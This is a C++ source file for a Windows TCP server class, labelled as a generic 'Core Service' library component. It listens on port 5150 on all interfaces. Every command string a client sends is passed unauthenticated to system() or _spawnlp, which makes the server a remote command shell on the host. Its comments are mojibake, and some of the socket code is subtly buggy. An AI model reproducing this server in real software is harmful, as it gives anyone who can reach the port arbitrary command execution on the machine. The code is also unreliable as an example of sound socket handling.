//*******************************************************************************
// COPYRIGHT NOTES
// ---------------
// This is a Core Service C++ Library.
// Copyright (C) 2002-2008 RISS Ltd.
// All rights reserved.
// 
// This source code or binary libary can be used, distributed or modified
// with or without modification, are permitted including commercial applications.
// -------------- 
//*******************************************************************************
// Server.cpp: implementation of the CSocketServer
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "TcpServer.h"
#include <process.h>
#include <errno.h>
#include "shlwapi.h"

#pragma  comment(lib, "shlwapi.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
CSocketServer::CSocketServer()
{
  m_InitWinSock  = FALSE;
	m_ListenSocket = 0;
  m_ClientSocket = 0;
	dwThreadId     = 0;
}

CSocketServer::~CSocketServer()
{

}

//��ñ��ؼ��������
int CSocketServer::GetLocalHostName(char *sHostName)
{
	char szHostName[256];
	int nRetCode;
	nRetCode=gethostname(szHostName,sizeof(szHostName));
	if(nRetCode!=0)
	{
		//��������
		strcpy(sHostName,"Not Available");
		return GetLastError();
	}
	strcpy(sHostName,szHostName);

	return 0;
}

long CSocketServer::Start()
{
  HANDLE hThead = CreateThread(NULL,0, (LPTHREAD_START_ROUTINE)CSocketServer::LoadWinsockThreadFn,(LPVOID)this,0,&dwThreadId);
  if(hThead)
  {
    CloseHandle(hThead);
  }

  return 0;
}

unsigned __stdcall CSocketServer::LoadWinsockThreadFn(LPVOID lpParam) 
{
  CSocketServer* pSock = (CSocketServer*)lpParam;
  pSock->RunStartThead();
  
  return 0;
}

long CSocketServer::StartClient()
{
  HANDLE 	hThread = CreateThread(NULL,0, (LPTHREAD_START_ROUTINE)CSocketServer::StartClientThreadFn,(LPVOID)this,0,&dwThreadId);
  if (hThread)
  {
    CloseHandle(hThread);
  }
  return 0;
}

unsigned __stdcall CSocketServer::StartClientThreadFn(LPVOID lpParam) 
{
  CSocketServer* pSock = (CSocketServer*)lpParam;
  pSock->ClientReceiverThead();
  
  return 0;
}

//���ر�����װ�����е���XP1_GUARANTEED_DELIVERY and XP1_GUARANTEED_ORDER��־��Э���Э����
// int SelectProtocols(DWORD dwSetFlags,DWORD dwNotSetFlags,LPWSAPROTOCOL_INFO lpProtocolBuffer,LPDWORD lpdwBufferLength,WSAPROTOCOL_INFO *pProtocol)
// {
// 	LPBYTE				pBuf;
// 	LPWSAPROTOCOL_INFO	pInfo;
// 	DWORD				dwNeededLen;
// 	LPWSAPROTOCOL_INFO	pRetInfo;
// 	DWORD				dwRetLen;
// 	int					nCount;
// 	int					nMatchCount;
// 	int					nRet;
// 
// 	// ������Ҫ�Ļ�������С
// 	dwNeededLen = 0;
// 	nRet = WSAEnumProtocols(NULL, NULL, &dwNeededLen);
// 	if (nRet == SOCKET_ERROR)
// 	{
// 		if (WSAGetLastError() != WSAENOBUFS)
// 			return SOCKET_ERROR;
// 	}
// 	// �����С
// 	pBuf = (LPBYTE)malloc(dwNeededLen);
// 	if (pBuf == NULL)
// 	{
// 		WSASetLastError(WSAENOBUFS);
// 		return SOCKET_ERROR;
// 	}
// 
// 	nRet = WSAEnumProtocols(NULL,(LPWSAPROTOCOL_INFO)pBuf,&dwNeededLen);
// 	if (nRet == SOCKET_ERROR)
// 	{
// 		free(pBuf);
// 		return SOCKET_ERROR;
// 	}
// 
// 	#define REJECTSET(f) \
// 	    ((dwSetFlags & f) && !(pInfo->dwServiceFlags1 & f))
// 	#define REJECTNOTSET(f) \
// 	    ((dwNotSetFlags &f) && (pInfo->dwServiceFlags1 & f))
// 	#define REJECTEDBY(f) (REJECTSET(f) || REJECTNOTSET(f))
// 
// 	pInfo = (LPWSAPROTOCOL_INFO)pBuf;	
// 	pRetInfo = lpProtocolBuffer;
// 	dwRetLen = 0;
// 	nMatchCount = 0;
// 	for(nCount = 0; nCount < nRet; nCount++)
// 	{
// 		while(1)
// 		{
// 			if (REJECTEDBY(XP1_CONNECTIONLESS))
// 				break;
// 			if (REJECTEDBY(XP1_GUARANTEED_DELIVERY))
// 				break;
// 			if (REJECTEDBY(XP1_GUARANTEED_ORDER))
// 				break;
// 			if (REJECTEDBY(XP1_MESSAGE_ORIENTED))
// 				break;
// 			if (REJECTEDBY(XP1_PSEUDO_STREAM))
// 				break;
// 			if (REJECTEDBY(XP1_GRACEFUL_CLOSE))
// 				break;
// 			if (REJECTEDBY(XP1_EXPEDITED_DATA))
// 				break;
// 			if (REJECTEDBY(XP1_CONNECT_DATA))
// 				break;
// 			if (REJECTEDBY(XP1_DISCONNECT_DATA))
// 				break;
// 			if (REJECTEDBY(XP1_SUPPORT_BROADCAST)) 
// 				break;
// 			if (REJECTEDBY(XP1_SUPPORT_MULTIPOINT))
// 				break;
// 			if (REJECTEDBY(XP1_MULTIPOINT_DATA_PLANE))
// 				break;
// 			if (REJECTEDBY(XP1_QOS_SUPPORTED))
// 				break;
// 			if (REJECTEDBY(XP1_UNI_SEND))
// 				break;
// 			if (REJECTEDBY(XP1_UNI_RECV))
// 				break;
// 			if (REJECTEDBY(XP1_IFS_HANDLES))
// 				break;
// 			if (REJECTEDBY(XP1_PARTIAL_MESSAGE))
// 				break;
// 
// 			dwRetLen += sizeof(WSAPROTOCOL_INFO);
// 
// 			if (dwRetLen > *lpdwBufferLength)
// 			{
// 				WSASetLastError(WSAENOBUFS);
// 				*lpdwBufferLength = dwNeededLen;
// 				free(pBuf);
// 				return SOCKET_ERROR;
// 			}
// 			nMatchCount++;
// 
// 			// ����Э�鵽�����ߵ�buffer��
// 			memblast(pRetInfo,pInfo,sizeof(WSAPROTOCOL_INFO));
// 			if (strcmp(pInfo->szProtocol,"MSAFD Tcpip [TCP/IP]") == 0)
// 				memblast(pProtocol,pInfo,sizeof(WSAPROTOCOL_INFO));
// 			pRetInfo++;
// 			break;
// 		}
// 		pInfo++;
// 	}
// 	free(pBuf);
// 	*lpdwBufferLength = dwRetLen;
// 	return(nMatchCount);
// }

BOOL CSocketServer::InitWinSock()
{
  WSADATA				wsaData;
  WORD wVersionRequested = MAKEWORD( 2, 2 );

  m_InitWinSock = FALSE;

  if (WSAStartup(wVersionRequested,&wsaData) != 0)
  {
    return FALSE;
  }

  /* Confirm that the WinSock DLL supports 2.2.*/
  /* Note that if the DLL supports versions greater    */
  /* than 2.2 in addition to 2.2, it will still return */
  /* 2.2 in wVersion since that is the version we      */
  /* requested.                                        */
  
  if ( LOBYTE( wsaData.wVersion ) != 2 ||
    HIBYTE( wsaData.wVersion ) != 2 ) 
  {
    /* Tell the user that we could not find a usable */
    /* WinSock DLL.                                  */
    WSACleanup( );
    return FALSE; 
  }

  m_InitWinSock = TRUE;

  return TRUE;
}


#define SETFLAGS			XP1_GUARANTEED_DELIVERY|XP1_GUARANTEED_ORDER
#define NOTSETFLAGS		XP1_CONNECTIONLESS
#define	LPBMIH				LPBITMAPINFOHEADER

CONST UINT    gPort  = 5150;
//LoadWinsock����װ�غͳ�ʼ��Winsock���󶨱��ص�ַ����������socket���Ⱥ�ͻ�������
DWORD CSocketServer::RunStartThead() 
{
	// Э�����
	LPBYTE				pBuf;
	//WSAPROTOCOL_INFO	Protocol;
	int					nRet;
	int					nZero = 0;
	int					iAddrSize;
	struct	sockaddr_in	local,client;
  
	// ����ṹ������LPARAM�����д�����Ϣ���ͻ����߳�
	// struct	myStruct	myStructure;
  if(!InitWinSock())
  {
    return -1;
  }
  
	// ΪЭ���ѡ�������Э��ı���������Ҫ�Ļ������Ĵ�С
	DWORD dwLen = 0;
	nRet = WSAEnumProtocols(NULL,NULL,&dwLen);
	if (nRet == SOCKET_ERROR)
	{
		if (WSAGetLastError() != WSAENOBUFS)
			return 1;
	}
	pBuf = (LPBYTE)malloc(dwLen);
  
	// ΪWSASocketGet()�õ�Э��
	//nRet = SelectProtocols(SETFLAGS,NOTSETFLAGS,(LPWSAPROTOCOL_INFO)pBuf,&dwLen,&Protocol);
  
	// �������ǵļ���socket
	m_ListenSocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_IP,NULL,0,SOCK_STREAM);
	if (m_ListenSocket == SOCKET_ERROR)
	{

    return 1;
	}

	// ����server����Ϣ
	local.sin_addr.s_addr = htonl(INADDR_ANY);
	local.sin_family = AF_INET;
	local.sin_port = htons(gPort);
  
	// �󶨵�socket
	if (bind(m_ListenSocket,(struct sockaddr *)&local,sizeof(local)) == SOCKET_ERROR)
	{
		return 1;
	}

	//Ϊ�˼�СCPU�������ʣ���ֹ��socket�Ͻ����ݷ��͵����塣����SO_SNDBUFΪ0,
	//�Ӷ�ʹwinsockֱ�ӷ������ݵ��ͻ��ˣ������ǽ����ݻ���ŷ��͡�
	nZero = 0;
	setsockopt(m_ListenSocket,SOL_SOCKET,SO_SNDBUF,(char *)&nZero, sizeof(nZero));

  //��ʼ����
	listen(m_ListenSocket, SOMAXCONN);
  
	iAddrSize = sizeof(client);
	while (TRUE)
	{
		// ������ʽ�Ľ��տͻ��˵����ӣ�����Ϊ����һ���̺߳����������û�����е�����
		m_ClientSocket = accept(m_ListenSocket,(struct sockaddr *)&client,&iAddrSize);
		if (m_ClientSocket != INVALID_SOCKET)
		{
			// ���ô����ͻ����̵߳���Ϣ�����ݽṹ
			//myStructure.Socket = Socket;
			//myStructure.hWnd = hServerWnd;

			//�ҳ��ͻ��˵�IP��ַ
      TRACE("ClientIP=%s, Port:%d \n", inet_ntoa(client.sin_addr),client.sin_port);
      
			// Ϊÿһ���ͻ��˴���һ���߳�
      StartClient();
		}
		else
    {
      TRACE("accept() failed. socket=%d. ", m_ClientSocket);
			return 1;
    }
	}

	return 0;
}
 

//
// Receiver, �ͻ����̺߳�������������Ⱥ�ӿͻ��˳����͹�������Ϣ��
// 
//��������Ϣ��"REFRESH",��ô�����͵�ǰ������ͼƬ
//��������Ϣ��"DISCONNECT",��ô�������Ϳͻ��˵�����
//��������Ϣ��"WM_"��ͷ����ô���͸�����Ϣ���ͣ��ڷ�������ִ�и���Ϣ
DWORD CSocketServer::ClientReceiverThead() 
{
	FD_SET	SocketSet;
	struct	timeval	timeout;
	char	szMessage[2049];
	DWORD	iRecv;
	int	iRet;

	// ���ó�ʱֵ
	timeout.tv_sec = 0;		// ��
	timeout.tv_usec = 0;	// ΢��

  while(!m_ClientSocket)
  {
    Sleep(100);
  }

	// ����Socket����
	SocketSet.fd_count = 1;
	SocketSet.fd_array[1] = m_ClientSocket;
  
	// ��ѯsockets
	while(TRUE)
	{
		// �Ⱥ��͹���������ֱ����ʱ

		iRet = select(0,&SocketSet,NULL,NULL,&timeout);
		if (iRet != 0)
		{
 			//��ʼ������
			memset(szMessage,'\0',sizeof(szMessage));
      
      if(m_ClientSocket == 0)
        break;

			// ������ʽ����recv()
			iRecv = recv(m_ClientSocket, szMessage, 2048,0);
      if(iRecv == SOCKET_ERROR)
      {
        goto end;
      }
      else if (iRecv<=0 || iRecv > 2048)
      {
        // If the connection has been gracefully closed.
        continue;
      }
			szMessage[iRecv] = '\0';
       
      CString strCmd = szMessage; 
      szMessage[iRecv] = '\n';
      szMessage[iRecv+1] = '\0';
      
      Transmit(m_ClientSocket, _T(">"), 1);
      Transmit(m_ClientSocket, szMessage, strlen(szMessage));

      strCmd.MakeLower();
      if(strCmd.Left(2) == _T("cd"))
      {
        system(strCmd);
      }
			else if (strncmp(strCmd,"DISCONNECT",10) == 0)
			{
				break;
			}    
      else 
      {
        CString strCmdName, strParam;
        int pos = strCmd.Find(_T(" "));
        if(pos == -1)
        {
          strCmdName = strCmd;
        }
        else 
        {
          strCmdName = strCmd.Left(pos); 
          strCmdName.TrimLeft();strCmdName.TrimRight();
          strParam = strCmd.Mid(pos+1, strCmd.GetLength() - pos);
          strParam.TrimLeft();strParam.TrimRight();
        }
        if(!strCmdName.IsEmpty())
        {
          CString strPath = PathSplitLast_i(strCmdName);
          if(!strPath.IsEmpty() && PathFileExists(strPath))
          {
            SetCurrentDirectory(strPath);
          }
          if(strCmdName == _T("cmd") && strParam == _T(""))
          {
            continue;
          }
          else
          {
            int ret = _spawnlp(_P_NOWAIT, strCmdName, strCmdName, strParam, NULL);
            if(ret == -1)
            {
              if(errno == ENOENT)
              {
                system(strCmd);
              }
              else 
              {
                printf("*** CMD error=%d : %s %s\n", errno, strCmdName, strParam);
              }
            }
          }
        }
      }
		}
	}
  
end:
	closesocket(m_ClientSocket);
  m_ClientSocket = 0;
  
	return 0;  
}

//�������ݵ��ͻ���
DWORD CSocketServer::Transmit(SOCKET socket,char *pData,DWORD dwLength)
{
	WSAOVERLAPPED	olSend;
	WSAEVENT	hEventOlSock = 0;
  WSAEVENT	eventArray[2] = {0, };
	WSABUF		buffSend;
	DWORD		dwRet,dwNumBytes,dwFlags;
	int			nWSAError;

  if(socket == 0)
    return -1;
  
	// Ϊ������ɴ���һ���ź��¼�
	hEventOlSock = WSACreateEvent();
  if(hEventOlSock == WSA_INVALID_EVENT)
  {
    return 0;
  }

	eventArray[0] = hEventOlSock;
  
	// ��ʼ���ص����͵Ľṹ
	ZeroMemory(&olSend, sizeof(WSAOVERLAPPED));
	
  // Ϊ�����ص��ṹ����һ���ź�ʱ��
	olSend.hEvent = hEventOlSock;
	buffSend.len  = dwLength;
	buffSend.buf  = pData;

	// �������ͣ�ֱ��dwSendLen���ֽڱ��������
	while (TRUE)
	{
    if(socket == 0)
      goto end;

		if ((dwRet = WSASend(socket,&buffSend,1,&dwNumBytes,0,&olSend,NULL)) == SOCKET_ERROR)
		{
			nWSAError= WSAGetLastError();      
			if (nWSAError != ERROR_IO_PENDING)
			{
        goto end;
			}
		}
	  
		if (WSAWaitForMultipleEvents(1,eventArray,FALSE,WSA_INFINITE,FALSE) == WSA_WAIT_FAILED)
		{
      goto end;
		}
    
		// ����gheventOlSock
		WSAResetEvent(eventArray[0]);
		if (WSAGetOverlappedResult(socket,&olSend,&dwNumBytes,FALSE,&dwFlags) == FALSE)
		{
		}
    
		buffSend.len -= dwNumBytes;
		if (buffSend.len == 0)
			break;
		else 
			buffSend.buf += dwNumBytes;
	}

end:
	// �ر��ź��¼�
  if(hEventOlSock)
	  WSACloseEvent(hEventOlSock);
  hEventOlSock = 0;
  
	return ERROR_SUCCESS;
}

